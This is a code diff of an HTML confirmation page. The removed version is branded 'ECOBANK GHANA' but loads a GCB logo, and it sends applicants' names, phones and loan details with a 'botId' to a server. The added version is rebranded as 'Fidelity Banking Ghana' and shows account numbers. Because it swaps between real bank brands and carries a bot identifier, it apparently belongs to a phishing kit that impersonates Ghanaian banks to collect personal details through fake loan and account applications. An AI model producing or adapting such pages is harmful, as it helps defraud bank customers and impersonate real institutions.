@@ -1,256 +1,357 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Application Successful</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Success – Fidelity Banking</title>
 
-<style>
-  body {
-    margin: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    background: #f5f5f5;
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 16px;
-    position: relative;
-  }
+    <style>
+        /* ================================
+           GLOBAL – Fidelity Theme
+        ================================= */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  /* LOADER */
-  .loader-screen {
-    position: fixed;
-    inset: 0;
-    background: #ffffff;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    z-index: 999;
-  }
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f9f7f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+        }
 
-  .spinner {
-    width: 50px;
-    height: 50px;
-    border: 5px solid #eee;
-    border-top: 5px solid #0a8f55;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin-bottom: 12px;
-  }
+        /* ================================
+           SUCCESS CARD
+        ================================= */
+        .card {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 28px 36px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
 
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .loader-text { font-size: 14px; color: #555; }
+        /* Decorative top bar */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #e11b22, #f5c518, #e11b22);
+            background-size: 200% 100%;
+            animation: shimmer 3s ease-in-out infinite;
+        }
 
-  /* CARD */
-  .container {
-    width: 100%;
-    max-width: 460px;
-    background: #ffffff;
-    border-radius: 16px;
-    padding: 0;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.12);
-    overflow: hidden;
-    display: none;
-    position: relative;
-  }
+        @keyframes shimmer {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 0%; }
+            100% { background-position: 0% 0%; }
+        }
 
-  /* CLOSE BUTTON OUTSIDE BOX */
-  .close-btn {
-    position: absolute;
-    top: -14px;
-    right: -14px;
-    width: 32px;
-    height: 32px;
-    background: #e11b22;
-    color: #fff;
-    border-radius: 50%;
-    font-weight: bold;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    z-index: 10;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
-  }
+        /* ================================
+           SUCCESS ICON
+        ================================= */
+        .success-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: #e11b22;
+            color: #ffffff;
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 30px rgba(225, 27, 34, 0.3);
+            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            transform: scale(0);
+        }
 
-  /* HEADER */
-  .brand-bar {
-    background: #0a8f55;
-    color: #fff;
-    text-align: center;
-    padding: 18px;
-  }
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
 
-  .brand-bar img { height: 50px; margin-bottom: 6px; }
-  .brand-text { font-size: 18px; font-weight: bold; }
+        .success-icon .checkmark {
+            line-height: 1;
+        }
 
-  /* RECEIPT BODY */
-  .receipt { padding: 20px; text-align: center; }
-  .success-icon { font-size: 50px; color: #0a8f55; margin-bottom: 10px; }
-  h1 { font-size: 20px; margin: 5px 0; color: #0a8f55; }
-  .subtitle { font-size: 13px; color: #777; margin-bottom: 15px; }
+        /* ================================
+           HEADER
+        ================================= */
+        .title {
+            font-size: 30px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 6px;
+        }
 
-  .receipt-box {
-    border: 1px dashed #ccc; border-radius: 10px;
-    padding: 15px; margin-top: 10px; text-align: left; background: #fafafa;
-  }
+        .title span {
+            color: #e11b22;
+        }
 
-  .row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; }
-  .label { color: #666; }
-  .value { font-weight: bold; text-align: right; max-width: 60%; word-break: break-word; }
-  .reference { text-align: center; font-weight: bold; margin-bottom: 10px; color: #333; }
-  .divider { border-top: 1px dashed #ccc; margin: 10px 0; }
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 6px;
+        }
 
-  button.continue, button.check-status {
-    margin-top: 16px; width: 100%; padding: 12px;
-    font-size: 14px; border: none; border-radius: 8px; cursor: pointer;
-  }
+        /* Gold accent line */
+        .accent-line {
+            width: 60px;
+            height: 3px;
+            background: #f5c518;
+            border-radius: 4px;
+            margin: 12px auto 24px;
+        }
 
-  button.continue { background: #0a8f55; color: #fff; }
-  button.continue:hover { background: #086b3b; }
-  button.check-status { background: #f5a623; color: #fff; margin-top: 8px; }
-  button.check-status:hover { background: #d4881f; }
+        /* ================================
+           MESSAGE
+        ================================= */
+        .message {
+            font-size: 15px;
+            color: #444444;
+            line-height: 1.6;
+            margin-bottom: 28px;
+            padding: 0 6px;
+        }
 
-  .footer-note { text-align: center; font-size: 12px; color: #777; margin-top: 10px; }
+        .message strong {
+            color: #e11b22;
+        }
 
-  @media (max-width: 480px) {
-    .row { flex-direction: column; align-items: flex-start; }
-    .value { text-align: left; }
-  }
-</style>
+        /* ================================
+           SUMMARY BOX
+        ================================= */
+        .summary-box {
+            background: #f9f7f6;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 28px;
+            text-align: left;
+            border: 1px solid #e5e5ea;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e5e5ea;
+            font-size: 14px;
+        }
+
+        .summary-item:last-child {
+            border-bottom: none;
+        }
+
+        .summary-label {
+            color: #888888;
+            font-weight: 500;
+        }
+
+        .summary-value {
+            color: #1c1c1e;
+            font-weight: 600;
+            text-align: right;
+            word-break: break-word;
+            max-width: 60%;
+        }
+
+        /* ================================
+           FINISH BUTTON (Pill shape)
+        ================================= */
+        .btn-finish {
+            display: inline-block;
+            width: 100%;
+            padding: 16px 0;
+            font-size: 17px;
+            font-weight: 700;
+            color: #ffffff;
+            background: #e11b22;
+            border: none;
+            border-radius: 999px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 24px rgba(225, 27, 34, 0.25);
+            letter-spacing: 0.3px;
+            text-decoration: none;
+        }
+
+        .btn-finish:hover {
+            background: #c9181f;
+            transform: scale(1.01);
+            box-shadow: 0 12px 32px rgba(225, 27, 34, 0.35);
+        }
+
+        .btn-finish:active {
+            transform: scale(0.97);
+        }
+
+        /* ================================
+           FOOTER NOTE
+        ================================= */
+        .footer-note {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #aaaaaa;
+        }
+
+        /* ================================
+           RESPONSIVE
+        ================================= */
+        @media (max-width: 420px) {
+            .card {
+                padding: 32px 18px 28px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .success-icon {
+                width: 72px;
+                height: 72px;
+                font-size: 38px;
+            }
+            .summary-box {
+                padding: 14px 16px;
+            }
+            .summary-item {
+                font-size: 13px;
+                flex-wrap: wrap;
+            }
+            .summary-value {
+                max-width: 100%;
+                text-align: left;
+                margin-top: 2px;
+            }
+            .btn-finish {
+                font-size: 16px;
+                padding: 14px 0;
+            }
+        }
+    </style>
 </head>
-
 <body>
 
-<!-- LOADER -->
-<div class="loader-screen" id="loader">
-  <div class="spinner"></div>
-  <div class="loader-text">Processing your application...</div>
-</div>
+    <div class="card">
 
-<!-- MAIN CONTENT -->
-<div class="container" id="mainContent">
+        <!-- Success Icon -->
+        <div class="success-icon">
+            <span class="checkmark">✓</span>
+        </div>
 
-  <div class="close-btn" onclick="window.close()">✕</div>
+        <!-- Title -->
+        <div class="title">
+            Welcome, <span id="displayName">Customer</span>!
+        </div>
+        <div class="subtitle">Your account is now active</div>
+        <div class="accent-line"></div>
 
-  <div class="brand-bar">
-    <img src="GCB_logo.jpeg" alt="Bank Logo">
-    <div class="brand-text">ECOBANK GHANA</div>
-  </div>
+        <!-- Message -->
+        <div class="message">
+            <strong>Application complete!</strong><br />
+            Your details have been successfully verified and submitted.
+            You're now part of the Fidelity Banking family.
+        </div>
 
-  <div class="receipt">
-    <div class="success-icon">✅</div>
-    <h1>Application Submitted</h1>
-    <div class="subtitle">Your loan request is under review</div>
+        <!-- Summary Box -->
+        <div class="summary-box" id="summaryBox">
+            <div class="summary-item">
+                <span class="summary-label">Full Name</span>
+                <span class="summary-value" id="summaryName">—</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Phone Number</span>
+                <span class="summary-value" id="summaryPhone">—</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Account Type</span>
+                <span class="summary-value" id="summaryAccountType">—</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Account Number</span>
+                <span class="summary-value" id="summaryAccountNumber">—</span>
+            </div>
+            <div class="summary-item" id="loanSummary" style="display:none;">
+                <span class="summary-label">Loan Amount</span>
+                <span class="summary-value" id="summaryLoanAmount">—</span>
+            </div>
+        </div>
 
-    <div class="receipt-box">
-      <div class="reference">
-        Ref: <span id="reference">—</span>
-      </div>
+        <!-- Finish Button -->
+        <button class="btn-finish" onclick="finishAndRestart()">Done — Back to Home</button>
 
-      <div class="divider"></div>
+        <div class="footer-note">
+            © 2026 Fidelity Banking Ghana
+        </div>
 
-      <div class="row"><div class="label">Full Name</div><div class="value" id="name">—</div></div>
-      <div class="row"><div class="label">Phone</div><div class="value" id="phone">—</div></div>
-      <div class="row"><div class="label">Email</div><div class="value" id="email">—</div></div>
-      <div class="row"><div class="label">Amount</div><div class="value" id="amount">—</div></div>
-
-      <div class="divider"></div>
-
-      <div class="row"><div class="label">Purpose</div><div class="value" id="purpose">—</div></div>
-      <div class="row"><div class="label">Term</div><div class="value" id="term">—</div></div>
-      <div class="row"><div class="label">Interest</div><div class="value" id="interest">—</div></div>
-      <div class="row"><div class="label">Repayment</div><div class="value" id="repayment">—</div></div>
     </div>
 
-    <button class="check-status" onclick="checkLoanStatus()">Check Loan Status</button>
-    <button class="continue" onclick="window.location.href='index.html'">Return Home</button>
-    <div id="alert"></div>
-    <div class="footer-note">
-      Funds will be disbursed if approved. Keep this receipt for records.
-    </div>
-  </div>
-</div>
+    <script>
+        // ================================
+        // LOAD DATA FROM localStorage
+        // ================================
+        function loadSummary() {
+            const name = localStorage.getItem('fullName') || 'Customer';
+            const phone = localStorage.getItem('phone') || 'Not provided';
+            
+            // Try to get account details from form.html
+            const accountType = localStorage.getItem('accountType') || '—';
+            const accountNumber = localStorage.getItem('accountNumber') || '—';
 
-<script>
-  const fullName = localStorage.getItem('fullName');
-  const phone = localStorage.getItem('phone');
-  const botId = localStorage.getItem('botId');
-  const loanData = JSON.parse(localStorage.getItem('loanFormData') || '{}');
+            // Try to get loan data (if user came from the loan application)
+            let loanData = null;
+            try {
+                const raw = localStorage.getItem('loanFormData');
+                if (raw) {
+                    loanData = JSON.parse(raw);
+                }
+            } catch (e) { /* ignore */ }
 
-  if (!fullName || !phone || !botId) {
-    alert('Session expired. Please start again.');
-    window.location.href = 'index.html';
-  }
+            // Display name in title
+            document.getElementById('displayName').textContent = name;
 
-  function generateReference() {
-    const now = new Date();
-    const date =
-      now.getFullYear().toString() +
-      String(now.getMonth() + 1).padStart(2,'0') +
-      String(now.getDate()).padStart(2,'0');
-    const rand = Math.floor(1000 + Math.random()*9000);
-    return `BOG-${date}-${rand}`;
-  }
+            // Fill summary
+            document.getElementById('summaryName').textContent = name;
+            document.getElementById('summaryPhone').textContent = phone;
+            document.getElementById('summaryAccountType').textContent = accountType;
+            document.getElementById('summaryAccountNumber').textContent = accountNumber;
 
-  let loanReference = localStorage.getItem('loanReference');
-  if (!loanReference) {
-    loanReference = generateReference();
-    localStorage.setItem('loanReference', loanReference);
-  }
+            // If loan data exists, show loan amount
+            if (loanData && loanData.loanAmount) {
+                document.getElementById('loanSummary').style.display = 'flex';
+                document.getElementById('summaryLoanAmount').textContent = 'GHS ' + loanData.loanAmount;
+            }
+        }
 
-  // Populate fields
-  document.getElementById('reference').textContent = loanReference;
-  document.getElementById('name').textContent = fullName;
-  document.getElementById('phone').textContent = phone;
-  document.getElementById('email').textContent = loanData.email || '—';
-  document.getElementById('amount').textContent = loanData.loanAmount ? `GHS ${Number(loanData.loanAmount).toLocaleString()}` : '—';
-  document.getElementById('purpose').textContent = loanData.loanPurpose || '—';
-  document.getElementById('term').textContent = loanData.loanTerm || '—';
-  document.getElementById('interest').textContent = loanData.interestRate ? loanData.interestRate+'%' : '—';
-  if (loanData.loanTerm && loanData.loanTerm.match(/\d+/)) {
-    const days = parseInt(loanData.loanTerm.match(/\d+/)[0],10);
-    const repayDate = new Date();
-    repayDate.setDate(repayDate.getDate() + days);
-    document.getElementById('repayment').textContent = repayDate.toLocaleDateString();
-  }
+        // ================================
+        // FINISH & RESTART
+        // ================================
+        function finishAndRestart() {
+            // Optional: clear sensitive data if you want a fresh start
+            // localStorage.clear(); 
+            // For now, just redirect to the welcome page
+            window.location.href = 'index.html';
+        }
 
-  // Hide loader
-  setTimeout(() => {
-    document.getElementById('loader').style.display = 'none';
-    document.getElementById('mainContent').style.display = 'block';
-  }, 1500);
-
-  // Send loan info to server
-  fetch('/submit-loan', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      name: fullName,
-      phone,
-      amount: loanData.loanAmount || '—',
-      reference: loanReference,
-      botId
-    })
-  }).catch(console.error);
-
-  async function checkLoanStatus() {
-    try {
-      const res = await fetch(`/check-loan/${loanReference}`);
-      const data = await res.json();
-      if (data.approved === true) window.location.href = 'approved.html';
-      else if (data.approved === false) window.location.href = 'rejected.html';
-    else
-    //  alert('Loan not yet approved. Please wait.');
-      document.getElementById('alert').textContent = 'Loan not yet approved. Please wait.';
-      document.getElementById('alert').style.color = 'blue';
-    } catch {
-      alert('Error checking loan status. Try again.');
-    }
-  }
-</script>
+        // ================================
+        // RUN ON LOAD
+        // ================================
+        window.addEventListener('DOMContentLoaded', loadSummary);
+    </script>
 
 </body>
 </html>
